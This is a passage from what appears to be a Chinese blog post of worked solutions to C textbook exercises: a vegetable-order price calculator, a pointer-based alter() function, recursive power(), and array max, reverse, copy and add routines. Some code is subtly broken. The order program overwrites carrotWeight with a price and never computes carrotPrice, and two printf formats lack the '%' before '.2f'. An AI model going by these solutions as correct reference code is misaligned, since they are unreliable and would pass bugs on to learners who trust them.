break;</span><br><span class="line"></span><br><span class="line">            case (&#x27;c&#x27;)://carrots</span><br><span class="line">                            printf(&quot;How many pounds of carrots would you like to add?&quot;);</span><br><span class="line">                            if (scanf(&quot;%f&quot;, &amp;weight) == 1)</span><br><span class="line">                                carrotWeight += weight;</span><br><span class="line">                            else</span><br><span class="line">                            &#123;</span><br><span class="line">                                flush_input_buffer();</span><br><span class="line">                                printf(&quot;Invalid input. Try again.\n&quot;);</span><br><span class="line">                                continue;       //repeat main program loop</span><br><span class="line">                            &#125;</span><br><span class="line">                            break;</span><br><span class="line">            default:</span><br><span class="line">                            printf(&quot;Invalid input. Try again.\n&quot;);</span><br><span class="line">                            continue;       //repeat main program loop</span><br><span class="line">        &#125;</span><br><span class="line">        //calculate subtotal</span><br><span class="line">        artichokePrice = artichokeWeight * ARTICHOKE_PRICE_PER_LB;</span><br><span class="line">        beetPrice = beetWeight * BEET_PRICE_PER_LB;</span><br><span class="line">        carrotWeight = carrotWeight * CARROT_PRICE_PER_LB;</span><br><span class="line">        subtotal = artichokePrice + beetPrice + carrotPrice;</span><br><span class="line"></span><br><span class="line">        //calculate discount</span><br><span class="line">        if (subtotal &gt;= 100)</span><br><span class="line">        &#123;</span><br><span class="line">            discount_flag = true;</span><br><span class="line">            discount = DISCOUNT_RATE * subtotal;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">            discount_flag = false;</span><br><span class="line"></span><br><span class="line">        //calulate transport</span><br><span class="line">        totalWeight = artichokeWeight + beetWeight + carrotWeight;</span><br><span class="line">        transport = calculate_transport(totalWeight);</span><br><span class="line"></span><br><span class="line">        //grand total</span><br><span class="line">        total = subtotal + transport - (discount_flag ? discount : 0.0);</span><br><span class="line"></span><br><span class="line">        printf(&quot;\n&quot;);</span><br><span class="line">        printf(&quot;Your order summary:\n\n&quot;);</span><br><span class="line">        printf(&quot;Artichokes: %.2flbs @ $.2f/lb: $%.2f\n&quot;,</span><br><span class="line">               artichokeWeight, ARTICHOKE_PRICE_PER_LB, artichokePrice);</span><br><span class="line">        printf(&quot;Beets: %.2flbs @ $.2f/lb: $%.2f\n&quot;,</span><br><span class="line">               beetWeight, BEET_PRICE_PER_LB, beetPrice);</span><br><span class="line">        printf(&quot;Carrots: %.2flbs @ $%.2f/lb: $%.2f\n&quot;,</span><br><span class="line">               carrotWeight, CARROT_PRICE_PER_LB, carrotPrice);</span><br><span class="line">        printf(&quot;\n&quot;);</span><br><span class="line">        printf(&quot;Subtotal: $%.2f\n&quot;, subtotal);</span><br><span class="line">        if (discount_flag)</span><br><span class="line">            printf(&quot;%.0f%% discount: $%.2f\n&quot;, DISCOUNT_RATE * 100, discount);</span><br><span class="line">        printf(&quot;Transport charges: $%.2f\n&quot;, transport);</span><br><span class="line">        printf(&quot;Grand total: $%.2f\n&quot;, total);</span><br><span class="line">        printf(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">        flush_input_buffer();</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void flush_input_buffer(void)</span><br><span class="line">&#123;</span><br><span class="line">    while (getchar() != &#x27;\n&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">float calculate_transport(float weight)</span><br><span class="line">&#123;</span><br><span class="line">    if (weight &lt; 5.0)</span><br><span class="line">        return TRANSPORT_5LB;</span><br><span class="line">    else if (weight &lt; 20.0)</span><br><span class="line">        return TRANSPORT_20LB;</span><br><span class="line">    else</span><br><span class="line">        return TRANSPORT_20LB + TRANSPORT_OVER_20_RATE * (weight - 20.0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>设计一个名为alter()的函数，接受两个int类型的变量x和y，把它们的值分别改成两个变量之和以及两变量之差。</li>
</ol>
<p>使用指针<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">void alter(int * pa, int * pb)</span><br><span class="line">&#123;</span><br><span class="line">    int temp;</span><br><span class="line">    temp = *pa + *pb;</span><br><span class="line">    *pb = *pa - *pb;</span><br><span class="line">    *pa = temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><strong> or </strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">void alter(int * pa, int * pb)</span><br><span class="line">&#123;</span><br><span class="line">    *pa += *pb;</span><br><span class="line">    *pb = *pa - 2 * *pb;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<ol>
<li>power()函数返回一个double类型数的正整数次幂。改进该函数，使其能正确计算负幂。另外，函数要处理0的任何次幂<br>都为0，任何数的0次幂都为1（函数应报告0的0次幂未定义，因此把该值处理为1）。使用递归函数并在程序中测试该函数。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;         //prototype for abs()</span><br><span class="line"></span><br><span class="line">double power(double base, int exponent);</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    double base, output;</span><br><span class="line">    int exponent;</span><br><span class="line"></span><br><span class="line">    printf(&quot;Test power() function:\n&quot;);</span><br><span class="line">    printf(&quot;Enter a :double: base and :int: exponent: &quot;);</span><br><span class="line">    while (scanf(&quot;%lf %d&quot;, &amp;base, &amp;exponent) == 2)</span><br><span class="line">    &#123;</span><br><span class="line">        output = power(base, exponent);</span><br><span class="line"></span><br><span class="line">        printf(&quot;%f ^ %d = %f \n&quot;, base, exponent, output);</span><br><span class="line"></span><br><span class="line">        printf(&quot;Enter a :double: base and :int: exponent: &quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">double power(double base, int exponent)</span><br><span class="line">&#123;</span><br><span class="line">    double dbl_power;</span><br><span class="line"></span><br><span class="line">    //handle powers of zero</span><br><span class="line">    if (base == 0)</span><br><span class="line">    &#123;</span><br><span class="line">        if (exponent == 0)</span><br><span class="line">        &#123;</span><br><span class="line">            printf(&quot;Warning: 0 ^ 0 is undefined. Using 1.\n&quot;);</span><br><span class="line">            return 1.0;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">            return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    if (exponent == 0) return 1;    //stop recursion</span><br><span class="line"></span><br><span class="line">    dbl_power = base * power(base, abs(exponent) - 1);  // recursion step</span><br><span class="line"></span><br><span class="line">    //if exponent is negative, take reciprocal</span><br><span class="line">    if (exponent &lt; 0) dbl_power = 1 / dbl_power;</span><br><span class="line"></span><br><span class="line">    return dbl_power;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li><p>编写一个函数，返回储存在double类型数组中最大值的下标，并在一个简单的程序中测试该函数。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;time.h&gt;</span><br><span class="line"></span><br><span class="line">#define SIZE 10</span><br><span class="line"></span><br><span class="line">int index_of_max(double *arr, int arr_size);</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">	// test index_of_max</span><br><span class="line"></span><br><span class="line">	printf(&quot;Driver for index_of_max: returns index of the largest value stored &quot;</span><br><span class="line">		   &quot;in an array of doubles.\n&quot;);</span><br><span class="line">	putchar(&#x27;\n&#x27;);</span><br><span class="line"></span><br><span class="line">	double test[SIZE];</span><br><span class="line"></span><br><span class="line">	srand(time(NULL)); // seed random number generator</span><br><span class="line"></span><br><span class="line">	// initialize test array with random doubles</span><br><span class="line">	for (int i = 0; i &lt; SIZE; i++)</span><br><span class="line">		test[i] = rand() / (double) RAND_MAX;</span><br><span class="line"></span><br><span class="line">	// print test array</span><br><span class="line"></span><br><span class="line">	printf(&quot;%5s &quot;, &quot;Index&quot;);</span><br><span class="line">	for (int i = 0; i &lt; SIZE; i++)</span><br><span class="line">		printf(&quot;| %6d &quot;, i);</span><br><span class="line">	printf(&quot;\n&quot;);</span><br><span class="line">	printf(&quot;%5s &quot;, &quot;Value&quot;);</span><br><span class="line">	for (int i = 0; i &lt; SIZE; i++)</span><br><span class="line">		printf(&quot;| %6.4f &quot;, test[i]);</span><br><span class="line">	printf(&quot;\n&quot;);</span><br><span class="line">	printf(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">	// print results </span><br><span class="line">	printf(&quot;The maximum value occurs at index %d\n&quot;, index_of_max(test, SIZE));</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int index_of_max(double *arr, int arr_size)</span><br><span class="line">&#123;</span><br><span class="line">	// return index of max value in array of doubles</span><br><span class="line"></span><br><span class="line">	int index_of_max = 0;</span><br><span class="line">	for (int i = 1; i &lt; arr_size; i++)</span><br><span class="line">		if (*(arr + i) &gt; *(arr + index_of_max))</span><br><span class="line">			index_of_max = i;</span><br><span class="line"></span><br><span class="line">	return index_of_max;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>编写一个函数，把double类型数组中的数据倒序排列，并在一个简单的程序中测试该函数。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;time.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void reverse_array(double *arr, int arr_size);</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">	// test reverse_array()</span><br><span class="line"></span><br><span class="line">	printf(&quot;Testing reverse_array()\n&quot;);</span><br><span class="line"></span><br><span class="line">	double test1[9];</span><br><span class="line">	double test2[10];</span><br><span class="line">	double test3[2];</span><br><span class="line"></span><br><span class="line">	srand(time(NULL));</span><br><span class="line"></span><br><span class="line">	// initialize test array 1 with 9 random doubles</span><br><span class="line">	for (int i = 0; i &lt; 9; i++)</span><br><span class="line">		test1[i] = rand() / (double) RAND_MAX;</span><br><span class="line"></span><br><span class="line">	// initialize test array 2 with 10 random doubles</span><br><span class="line">	for (int i = 0; i &lt; 10; i++)</span><br><span class="line">		test2[i] = rand() / (double) RAND_MAX;</span><br><span class="line"></span><br><span class="line">	// initialize test array 1 with 2 random doubles</span><br><span class="line">	for (int i = 0; i &lt; 2; i++)</span><br><span class="line">		test3[i] = rand() / (double) RAND_MAX;</span><br><span class="line"></span><br><span class="line">	// test array 1</span><br><span class="line"></span><br><span class="line">	printf(&quot;First Test\n&quot;);</span><br><span class="line">	// print original array</span><br><span class="line">	printf(&quot;%10s: &quot;, &quot;Original&quot;);</span><br><span class="line">	for (int i = 0; i &lt; 9; i++)</span><br><span class="line">		printf(&quot;%5.2f &quot;, test1[i]);</span><br><span class="line">	putchar(&#x27;\n&#x27;);</span><br><span class="line"></span><br><span class="line">	//print reversed array</span><br><span class="line">	reverse_array(test1, 9);</span><br><span class="line">	printf(&quot;%10s: &quot;, &quot;Reversed&quot;);</span><br><span class="line">	for (int i = 0; i &lt; 9; i++)</span><br><span class="line">		printf(&quot;%5.2f &quot;, test1[i]);</span><br><span class="line">	putchar(&#x27;\n&#x27;);</span><br><span class="line"></span><br><span class="line">	// test array 2</span><br><span class="line"></span><br><span class="line">	printf(&quot;Second Test\n&quot;);</span><br><span class="line">	// print original array</span><br><span class="line">	printf(&quot;%10s: &quot;, &quot;Original&quot;);</span><br><span class="line">	for (int i = 0; i &lt; 10; i++)</span><br><span class="line">		printf(&quot;%5.2f &quot;, test2[i]);</span><br><span class="line">	putchar(&#x27;\n&#x27;);</span><br><span class="line"></span><br><span class="line">	//print reversed array</span><br><span class="line">	reverse_array(test2, 10);</span><br><span class="line">	printf(&quot;%10s: &quot;, &quot;Reversed&quot;);</span><br><span class="line">	for (int i = 0; i &lt; 10; i++)</span><br><span class="line">		printf(&quot;%5.2f &quot;, test2[i]);</span><br><span class="line">	putchar(&#x27;\n&#x27;);</span><br><span class="line"></span><br><span class="line">	// test array 3</span><br><span class="line"></span><br><span class="line">	printf(&quot;Third Test\n&quot;);</span><br><span class="line">	// print original array</span><br><span class="line">	printf(&quot;%10s: &quot;, &quot;Original&quot;);</span><br><span class="line">	for (int i = 0; i &lt; 2; i++)</span><br><span class="line">		printf(&quot;%5.2f &quot;, test3[i]);</span><br><span class="line">	putchar(&#x27;\n&#x27;);</span><br><span class="line"></span><br><span class="line">	//print reversed array</span><br><span class="line">	reverse_array(test3, 2);</span><br><span class="line">	printf(&quot;%10s: &quot;, &quot;Reversed&quot;);</span><br><span class="line">	for (int i = 0; i &lt; 2; i++)</span><br><span class="line">		printf(&quot;%5.2f &quot;, test3[i]);</span><br><span class="line">	putchar(&#x27;\n&#x27;);</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void reverse_array(double *arr, int arr_size)</span><br><span class="line">&#123;</span><br><span class="line">	// reverse an array of double</span><br><span class="line"></span><br><span class="line">	double tmp;</span><br><span class="line"></span><br><span class="line">	for (int i = 0; i &lt; arr_size / 2; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		// swap values between indexes i and (arr_size - 1 - i)</span><br><span class="line">		tmp = arr[i];</span><br><span class="line">		arr[i] = arr[arr_size - 1 - i];</span><br><span class="line">		arr[arr_size - 1 - i] = tmp;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用编程练习2中的拷贝函数，把一个内含7个元素的数组中第3～第5个元素拷贝至内含3个元素的数组中。该函数本身不需要修改，只需要选择合适的实际参数（实际参数不需要是数组名和数组大小，只需要是数组元素的地址和待处理元素的个数）。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void copy_ptrs(double *target, double *source_start, double *source_end);</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">	double source[7] = &#123;2.4, 5.9, 7.8, 1.5, 3.3, 5.3, 6.8&#125;;</span><br><span class="line">	double target[3];</span><br><span class="line"></span><br><span class="line">	copy_ptrs(target, source + 2, source + 5);</span><br><span class="line"></span><br><span class="line">	// print arrays</span><br><span class="line">	for (int i = 0; i &lt; 7; i++)</span><br><span class="line">		printf(&quot;%.1f &quot;, source[i]);</span><br><span class="line">	putchar(&#x27;\n&#x27;);</span><br><span class="line"></span><br><span class="line">	for (int i = 0; i &lt; 3; i++)</span><br><span class="line">		printf(&quot;%.1f &quot;, target[i]);</span><br><span class="line">	putchar(&#x27;\n&#x27;);</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void copy_ptrs(double *target, double *source_start, double *source_end)</span><br><span class="line">&#123;</span><br><span class="line">	// copy arr using pointer notation and pointer endpoint</span><br><span class="line"></span><br><span class="line">	for (double *ptr = source_start; ptr &lt; source_end; ptr++, target++)</span><br><span class="line">		*target = *ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>编写一个程序，初始化一个double类型的3×5二维数组，使用一个处理变长数组的函数将其拷贝至另一个二维数组中。还要编写一个以变长数组为形参的函数以显示两个数组的内容。这两个函数应该能处理任意N×M数组。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#define ROWS 3</span><br><span class="line">#define COLUMNS 5</span><br><span class="line"></span><br><span class="line">void copy_2dim_arr(int rows, int cols, double source[rows][cols], double target[rows][cols]);</span><br><span class="line">void print_2dim_arr(int rows, int cols, double arr[rows][cols]);</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    double array1[ROWS][COLUMNS] = &#123;</span><br><span class="line">            &#123;4.3, 5.7, 2.1, 6.6, .8&#125;,</span><br><span class="line">            &#123;5.6, 23.5, 73.2, 12.3, 123&#125;,</span><br><span class="line">            &#123;22.1, 35.3, 6.35, 0.132, 11.1&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    double array2[ROWS][COLUMNS];</span><br><span class="line"></span><br><span class="line">    // copy array1 to array2</span><br><span class="line">    copy_2dim_arr(ROWS, COLUMNS, array1, array2);</span><br><span class="line"></span><br><span class="line">    // print contents of arrays</span><br><span class="line">    printf(&quot;Array 1:\n&quot;);</span><br><span class="line">    print_2dim_arr(ROWS, COLUMNS, array1);</span><br><span class="line">    putchar(&#x27;\n&#x27;);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Array2:\n&quot;);</span><br><span class="line">    print_2dim_arr(ROWS, COLUMNS, array2);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void copy_2dim_arr(int rows, int cols, double source[rows][cols], double target[rows][cols])</span><br><span class="line">&#123;</span><br><span class="line">    // copy one two-dimensional array to another</span><br><span class="line">    for (int i = 0; i &lt; rows; i++)&#123;</span><br><span class="line">        for (int j = 0; j &lt; cols; j++)</span><br><span class="line">            target[i][j] = source[i][j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void print_2dim_arr(int rows, int cols, double arr[rows][cols])</span><br><span class="line">&#123;</span><br><span class="line">    //print the contents of a two-dimensional array</span><br><span class="line"></span><br><span class="line">    for (int i = 0; i &lt; rows; i++) &#123;</span><br><span class="line">        for (int j = 0; j &lt; cols; j++)</span><br><span class="line">            printf(&quot; %10.3f &quot;, arr[i][j]);</span><br><span class="line"></span><br><span class="line">        putchar(&#x27;\n&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>编写一个函数，把两个数组中相对应的元素相加，然后把结果储存到第 3 个数组中。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;time.h&gt;</span><br><span class="line"></span><br><span class="line">#define SIZE 10</span><br><span class="line">void add_arrays(int *addend1, int *addend2, int *sum, int array_length);</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    //test add_arrays</span><br><span class="line">    srand(time(NULL));</span><br><span class="line"></span><br><span class="line">    int array1[SIZE];</span><br><span class="line">    int array2[SIZE];</span><br><span class="line">    int sum[SIZE];</span><br><span class="line"></span><br><span class="line">    // initialize arrays with random ints</span><br><span class="line">    for (int i = 0; i &lt; SIZE; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        array1[i] = rand() % 20;</span><br><span class="line">        array2[i] = rand() % 20;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // get sum of arrays</span><br><span class="line">    add_arrays(array1, array2, sum, SIZE);</span><br><span class="line"></span><br><span class="line">    //print arrays</span><br><span class="line">    printf(&quot;%8s %8s %8s\n&quot;, &quot;Array 1&quot;, &quot;Array 2&quot;, &quot;Sum&quot;);</span><br><span class="line">    for (int i = 0; i &lt; SIZE; i++)</span><br><span class="line">        printf(&quot;%8d %8d %8d\n&quot;, array1[i], array2[i], sum[i]);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void add_arrays(int *addend1, int *addend2, int *sum, int array_length)</span><br><span class="line">&#123;</span><br><span class="line">    // calculate elementwise sum of two arrays</span><br><span class="line">    for (int *tar = sum; tar &lt; sum + array_length; tar++, addend1++, addend2++)</span><br><span class="line">        *tar = *addend1 + *addend2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>编写一个程序，提示用户输入3组数，每组数包含5个double类型的数（假设用户都正确地响应，不会输入非数值数据）。该程序应完成下列任<br>务。<br>a.把用户输入的数据储存在3×5的数组中<br>b.计算每组（5个）数据的平均值<br>c.计算所有数据的平均值<br>d.找出这15个数据中的最大值<br>e.打印结果<br>每个任务都要用单独的函数来完成（使用变长数组作为函数形参的方式）。完成任务b，要编写一个计算并返回一维数组平均值的函数，利用循环调用该函数3次。对于处理其他任务的函数，应该把整个数组作为参数，完成任务c和d的函数应把结果返回主调函数。</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#define ROWS 3</span><br><span class="line">#define COLUMNS 5</span><br><span class="line"></span><br><span class="line">void input_data(int rows, int columns, double array[][5]);</span><br><span class="line">double compute_row_average(double *array, int cols);</span><br><span class="line">double compute_array_average(int rows, int cols, double array[rows][cols]);</span><br><span class="line">double largest_vlue(int rows, int cols, double array[rows][cols]);</span><br><span class="line"></span><br><span class="line">int main() 